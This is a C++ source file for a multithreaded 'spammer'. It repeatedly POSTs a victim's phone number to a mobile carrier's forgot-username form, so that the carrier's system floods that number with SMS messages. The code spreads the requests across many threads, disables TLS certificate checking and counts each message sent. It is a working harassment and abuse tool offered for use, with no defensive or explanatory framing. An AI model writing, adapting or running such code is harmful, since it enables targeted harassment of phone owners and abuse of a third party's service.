/****
*****This program will include some equivalent to the modules I use in python2
*****Now it's the alpha spammer multithreaded
****/

#include "spam.h"
#include <iostream>                //input/output
#include <unistd.h>                //for sleep()
#include <cstring>                //for strings
#include <boost/thread/thread.hpp> //for the thread   -- multiplatform
#include <boost/thread/mutex.hpp>  //for the thread   -- mutex
#include <boost/bind.hpp>          //for the thread   -- foo bin
#include <boost/thread/once.hpp>   //for the thread   -- exec once
#include <curl/curl.h>             //for webinteraction


int sms_sent =0;
bool is_spamming=1;
using namespace std;

///========GLOBAL VARS==========///
char myphone[8];
//global mutex
//to tell the other thread not access
// what is after if locked
boost::mutex io_mutex;
//flag for the exec once foo
boost::once_flag flag = BOOST_ONCE_INIT;
bool has_been_reinit  = false;
int    nb_of_sms=2;
//int   sms_sent = 0;

///========STRING WRITE==========///
size_t write_to_string(void *curl, size_t size, size_t count, void *response)
{
  ((string*)response)->append((char*)curl, 0, size*count);
  return size*count;
}

///=======RESET NB SMS==========///
void reset_nb_sms()
{
	has_been_reinit = true;
	sleep(5);
	nb_of_sms=2;
	has_been_reinit = false;

}

///========CURL POST==========///
void post_on_site()
{
	///initialize curl
	CURL *curl;
	//res is the error handling of curl -- return code
	CURLcode res;
	string response="";

	///For W$ -- init winsock
	/*curl_global_init(CURL_GLOBAL_ALL);*/

	///REPEAT ALL
	while(1)
	{
        if(is_spamming==0)
        {
            ///get a curl handle
            curl = curl_easy_init();

            ///Start the procedure
            if(curl)
            {
                //First set the URL that is about to receive our POST. This URL can
                //just as well be a https:// URL if that is what should receive the
                //data.
                curl_easy_setopt(curl, CURLOPT_URL,
                                "https://www.alfa.com.lb/ForgotUsername.aspx?rand=908854091");


                //Now specify the POST data
                string myphone_string="";
                for(int ss=0;ss<strlen(myphone);ss++)
                {
                    myphone_string+=myphone[ss];
                }
                string MYPOST_DATA =
                "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTQxODE5MDY2NWQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFH2N0bDAwJENvbnRlbnRQbGFjZUhvbGRlciRzdWJtaXRsZkOH4ZsR%2FisYgcqeuB4dpYs6Gg%3D%3D&__EVENTVALIDATION=%2FwEWBwLUtqLbBQKywMaSCwKNioKyBwL%2FsouVAwLw8S0CrISgjQ0CyJPkwgLlpjFmowrAes9rdOvk13JLAYLHYA%3D%3D&ctl00%24txtMemberName_R1G3GK55XPTOALFA=&ctl00%24txtPassword_R1G3GK55XPTOALFA=&ctl00%24ContentPlaceHolder%24txtMobile=" + myphone_string + "&ctl00%24ContentPlaceHolder%24submit.x=25&ctl00%24ContentPlaceHolder%24submit.y=7&ctl00%24hfSignin=0";
                //and set it as the options for curl
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, MYPOST_DATA.c_str());
                curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);  // this line makes it work under https

                //Handle the response
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_string);
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

                cout<<"\033[0m[\033[94m+\033[0m] A New SMS has been Sent!\n";
                sms_sent++;

                //Perform the request, res will get the return code
                res = curl_easy_perform(curl);

                //Check the return code for errors
                if(res != CURLE_OK)
                fprintf(stderr, "curl_easy_perform() failed: %s\n",
                    curl_easy_strerror(res));
            }

            ///cleanup curl
            curl_easy_cleanup(curl);

            ///maybe sleep here
            //Parameter in sleep is in seconds
        }
        sleep(1);
	}
}



///========DO_SPAM()==========///
void do_spam(int given_nb_thread,char phone_to_spam[8])
{   
	///Create the Thread handler
	strcpy(myphone,phone_to_spam);
	int my_nb_threads;
	my_nb_threads=given_nb_thread;

	///Now start the threads
	///THREADS
	//Store the thread in a vector stack
	std::vector<boost::thread *> z;
	//start the func
	for (int i = 0; i < my_nb_threads; ++i)
		z.push_back(new boost::thread(
										boost::bind(&post_on_site)
									));
	//wait for them to finish
	for (int i = 0; i < my_nb_threads; ++i)
	{
	  //wait for end; otherwise the program will
	  //end directly after starting all the threads
	  z[i]->join();
	  //remove from the stack
	  delete z[i];
	}

}
